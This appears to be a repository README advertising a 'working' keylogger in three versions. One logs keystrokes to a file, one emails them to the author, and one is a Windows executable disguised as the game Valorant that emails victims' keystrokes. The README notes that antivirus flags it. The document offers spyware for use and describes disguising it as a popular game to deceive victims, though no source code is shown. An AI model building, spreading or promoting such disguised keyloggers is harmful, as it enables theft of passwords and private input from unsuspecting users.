# KeyLogger Virus (WORKING!)

I wrote a Keylogger Virus that actually works and looks like the game Valorant

**WARNING! ANTIVIRUS PROGRAMS (such as AVAST FREE ANTIVIRUS) WILL FLAG VALORANT.EXE**

## General (Three Versions of Keylogger)
- keylogger.py - saves your keyboard log files into a text.txt
- keylogger2.py - sends your keyborad log files to my email
- Valorant.exe - sends your keyboard log files to my email, but it is an Windows Application Executable disgused as the popular game, VALORANT
